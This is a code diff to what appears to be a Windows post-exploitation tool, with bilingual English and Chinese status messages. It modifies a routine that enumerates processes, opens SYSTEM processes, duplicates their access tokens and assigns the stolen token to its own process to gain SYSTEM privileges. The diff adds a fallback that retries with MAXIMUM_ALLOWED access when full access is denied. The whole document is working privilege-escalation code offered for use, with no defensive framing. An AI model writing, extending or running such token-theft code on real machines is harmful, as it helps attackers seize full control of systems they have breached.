@@ -7,7 +7,6 @@
 HANDLE hDupPriToken = 0xcccccccccccccccc;
 HANDLE hDupImpToken = 0xcccccccccccccccc;
 HANDLE hToken = 0xcccccccccccccccc;
-HANDLE hTokenProcess = 0xcccccccccccccccc;
 
 void LocalPrivilegeErrorHandler() {
     setlocale(LC_ALL, "");
@@ -41,7 +40,6 @@ void LocalPrivilegeErrorHandler() {
         DWORD PriUserDomainSize = 256;
         SID_NAME_USE PriUserUse;
         LookupAccountSid(NULL, PriTokenUser->User.Sid, PriUserName, &PriUserNameSize, PriUserDomain, &PriUserDomainSize, &PriUserUse);
-        
         TCHAR ImpUserName[256];
         TCHAR ImpUserDomain[256];
         DWORD ImpUserNameSize = 256;
@@ -163,11 +161,13 @@ void LocalPrivilegeErrorHandler() {
     free(PriTokenGroupsAndPrivileges);
     free(ImpTokenUser);
     free(ImpTokenGroupsAndPrivileges);
+
+    SFNtSetInformationProcess(GetCurrentProcess(), ProcessAccessToken, &hDupPriToken, sizeof(HANDLE));
                 o_mode = 0;
                 o_restart = 1;
                 main();
             } else {
-                SFPrintError("Failed to Duplicaet Token.", "复制令牌失败");
+                SFPrintError("Failed to Duplicate Token.", "复制令牌失败");
                 o_restart = 1;
                 main();
             }
@@ -181,12 +181,15 @@ void LocalPrivilegeErrorHandler() {
 }
 
 void SFLocalPrivilege() {
+    HANDLE hTokenProcess;
+    DWORD failure = 0;
     NTSTATUS status;
     ULONG bufferSize = 1024 * 1024;
     PVOID buffer = malloc(bufferSize);
     status = SFNtQuerySystemInformation(SystemProcessInformation, buffer, bufferSize, &bufferSize);
     PSYSTEM_PROCESS_INFORMATION processInfo = (PSYSTEM_PROCESS_INFORMATION)buffer;
     SFPrintStatus("Searching for a Proper Process to Steal Access Token.", "正在寻找合适的进程进行访问令牌窃取");
+    GetToken:
     while (1) {
         hTokenProcess = 0xcccccccccccccccc;
         OBJECT_ATTRIBUTES objectAttributes;
@@ -194,7 +197,11 @@ void SFLocalPrivilege() {
         clientId.UniqueProcess = processInfo->UniqueProcessId;
         clientId.UniqueThread = NULL;
         InitializeObjectAttributes(&objectAttributes, NULL, 0, NULL, NULL);
+        if (failure == 0) {
         status = SFNtOpenProcess(&hTokenProcess, PROCESS_ALL_ACCESS, &objectAttributes, &clientId);
+        } else {
+            status = SFNtOpenProcess(&hTokenProcess, MAXIMUM_ALLOWED, &objectAttributes, &clientId);
+        }
         if (hTokenProcess != 0xcccccccccccccccc && hTokenProcess != 0) {
             hToken = 0xcccccccccccccccc;
             status = SFNtOpenProcessToken(hTokenProcess, MAXIMUM_ALLOWED, &hToken);
@@ -241,9 +248,16 @@ void SFLocalPrivilege() {
                                     &processInfo->ImageName);
                             }
                             printf("----------------------------------------\n");
-                            SFPrintStatus("Detected Accessible SYSTEM Process", "发现可访问的系统进程");
+                            if (failure == 0) {
+                                SFPrintStatus("Detected Fully Accessible SYSTEM Process", "发现可完全访问的系统进程");
+                                hFakeProcess = hTokenProcess;
+                                FakeProcess = 1;
+                            } else {
+                                SFPrintStatus("Detected Accessible SYSTEM Process", "发现可访问的系统进程");
+                            }
                             hDupPriToken = 0xcccccccccccccccc;
                             hDupImpToken = 0xcccccccccccccccc;
+                            TokenPrivilege = 1;
                             o_mode = 1;
                             SFPrintStatus("Attempting to Steal Access Token", "尝试窃取访问令牌");
                             status = SFNtDuplicateToken(hToken, TOKEN_ALL_ACCESS, NULL, FALSE, TokenPrimary, &hDupPriToken);
@@ -254,12 +268,18 @@ void SFLocalPrivilege() {
                     free(tokenUser);
                     SFNtClose(hToken);
                 }
-                SFNtClose(hTokenProcess);
             }
-            if (processInfo->NextEntryOffset == 0)
-                break;
+            if (processInfo->NextEntryOffset == 0) break;
             processInfo = (PSYSTEM_PROCESS_INFORMATION)((PUCHAR)processInfo + processInfo->NextEntryOffset);
         }
+        if (failure == 0) {
+            SFPrintError("Failed to Obtain a Full Access SYSTEM Process Handle.", "获取完全访问的系统进程句柄失败");
+            SFPrintStatus("Attempting to Obtain a SYSTEM Token Only", "尝试仅获取SYSTEM令牌");
+            failure = 1;
+            goto GetToken;
+        } else {
         SFPrintError("Failed to Obtain SYSTEM Token.", "获取SYSTEM令牌失败");
         free(buffer);
+        return;
+        }
     }
